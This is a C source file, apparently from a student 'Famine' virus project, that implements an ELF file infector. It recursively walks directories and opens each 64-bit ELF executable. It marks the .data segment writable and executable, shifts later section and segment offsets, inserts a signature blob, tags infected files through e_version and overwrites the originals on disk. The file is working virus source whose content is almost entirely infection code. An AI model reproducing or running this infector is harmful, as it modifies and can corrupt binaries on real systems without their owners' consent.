#include "../famine.h"

Elf64_Shdr	*search_section(void *ptr, Elf64_Shdr *shdr_base, int shnum, uint32_t index, char *sct_name)
{
	int			i;
	Elf64_Shdr	*shdr;
	char		*sct_names;
	char		*name;

	shdr = shdr_base + index;
	if (!is_in_address(shdr + 1) || !is_in_address(shdr_base + shnum) || !is_in_address(ptr + shdr->sh_offset))
		return (NULL);
	sct_names = ptr + shdr->sh_offset;
	i = -1;
	while (++i < shnum)
	{
		shdr = shdr_base + i;
		if (!is_in_address((void*)shdr + sizeof(*shdr)))
			return (0);
		name = sct_names + shdr->sh_name;
		if (!is_str_in_address(name))
			return (0);
		if (!strcmp(name, sct_name))
			return (shdr);
	}
	return (NULL);
}

int			modify_program_header(void *ptr, t_famine *info)
{
	Elf64_Ehdr	*ehdr;
	Elf64_Phdr	*phdr;
	int			i;

	ehdr = ptr;
	phdr = ptr + ehdr->e_phoff;
	if (!is_in_address(phdr) || !is_in_address(phdr + ehdr->e_phnum))
		return (0);
	i = -1;
	info->data_phdr = NULL;
	while (++i < ehdr->e_phnum)
	{
		if (info->data_shdr->sh_offset >= phdr->p_offset &&
			info->data_shdr->sh_offset < phdr->p_offset + phdr->p_filesz)
		{
			phdr->p_flags |= 0b111;
			info->data_phdr = phdr;
			info->bss_size = phdr->p_memsz - phdr->p_filesz;
		}
		else if (info->data_phdr && phdr->p_offset > info->data_phdr->p_offset + info->data_phdr->p_filesz)
		{
			phdr->p_offset += info->bits_added;
			phdr->p_paddr ? phdr->p_paddr += info->bits_added : 0;
			phdr->p_vaddr ? phdr->p_vaddr += info->bits_added : 0;
		}
		phdr += 1;
	}
	if (!info->data_phdr)
		return (0);
	return (1);
}

int			modify_sections(void *ptr, Elf64_Shdr *shdr_base, uint32_t shnum, uint32_t index, t_famine *info)
{
	int				i;
	Elf64_Shdr		*shdr;
	char			*sct_names;
	char			*name;

	if (index >= shnum || !is_in_address(shdr_base) || !is_in_address(shdr_base + shnum - 1))
		return (0);
	shdr = shdr_base + index;
	sct_names = ptr + shdr->sh_offset;
	if (!is_in_address(sct_names))
		return (0);
	i = -1;
	while (++i < (int)shnum)
	{
		shdr = shdr_base + i;
		name = sct_names + shdr->sh_name;
		if (!is_str_in_address(name))
			return (0);
		if (shdr->sh_offset >= info->data_phdr->p_offset + info->data_phdr->p_filesz && strcmp(".bss", name))
		{
			shdr->sh_addr ? shdr->sh_addr += info->bits_added : 0;
			shdr->sh_offset += info->bits_added;
		}
	}
	return (1);
}

int			rewrite_binary(void *ptr, Elf64_Ehdr *ehdr, t_famine *info, char *path)
{
	int			fd;
	uint64_t	size_begining;
	void		*end_file;
	int			wrote;
	void		*new_binary;

	ehdr->e_version = 42;
	new_binary = malloc(get_ptr_end() - get_ptr_start() + info->bits_added);
	ehdr->e_shoff += info->bits_added;
	size_begining = info->data_phdr->p_offset + info->data_phdr->p_filesz;
	memcpy(new_binary, ptr, size_begining);
	wrote = size_begining;
	memcpy(new_binary + wrote, signature, sizeof(signature));
	wrote += sizeof(signature);
	end_file = ptr + size_begining;
	memcpy(new_binary + wrote, end_file, (size_t)(get_ptr_end() - end_file));
	wrote += (size_t)(get_ptr_end() - end_file);
	if (wrote != get_ptr_end() - get_ptr_start() + info->bits_added)
		return (0);
	fd = open(path, O_WRONLY | O_TRUNC);
	if (fd < 0)
		return (0);
	if (wrote != write(fd, new_binary, wrote))
		return (0);
	if (close(fd) != 0)
		return (0);
	return (1);
}

int			infect_elf(void *ptr, char *path)
{
	Elf64_Ehdr		*ehdr;
	t_famine		info;

	if (!is_in_address(ptr + sizeof(*ehdr)))
		return (0);
	ehdr = ptr;
	if (strncmp((const char *)ehdr->e_ident, ELFMAG, 4))
		return (0);
	if (ehdr->e_ident[EI_CLASS] != ELFCLASS64)
		return (0);
	if (ehdr->e_type != ET_EXEC && ehdr->e_type != ET_DYN)
		return (0);
	if (ehdr->e_version == 42)
		return (0);
	info.bits_added = sizeof(signature);
	info.data_shdr = search_section(ptr, ptr + ehdr->e_shoff, ehdr->e_shnum, ehdr->e_shstrndx, ".data");
	if (!info.data_shdr || !modify_program_header(ptr, &info))
		return (0);
	if (is_infected(ptr + info.data_phdr->p_filesz + info.data_phdr->p_offset))
		return (0);
	if (!modify_sections(ptr, ptr + ehdr->e_shoff, ehdr->e_shnum, ehdr->e_shstrndx, &info))
		return (0);
	return (rewrite_binary(ptr, ehdr, &info, path));
}

void		process_file(char *name, char *path)
{
	int				fd;
	struct stat		buf;
	void			*ptr;

	(void)name;
	if (lstat(path, &buf) == -1)
		return ;
	if (S_ISLNK(buf.st_mode))
		return ;
	if (S_ISDIR(buf.st_mode))
		return (process_directory(path));
	fd = open(path, O_RDONLY);
	if (fd < 0)
		return ;
	if (!S_ISREG(buf.st_mode))
		return ((void)close(fd));
	if (buf.st_size <= 0)
		return ((void)close(fd));
	ptr = mmap(NULL, buf.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (ptr == MAP_FAILED)
		return ((void)close(fd));
	init_check_address(ptr, buf.st_size);
	infect_elf(ptr, path);
	munmap(ptr, buf.st_size);
	close(fd);
}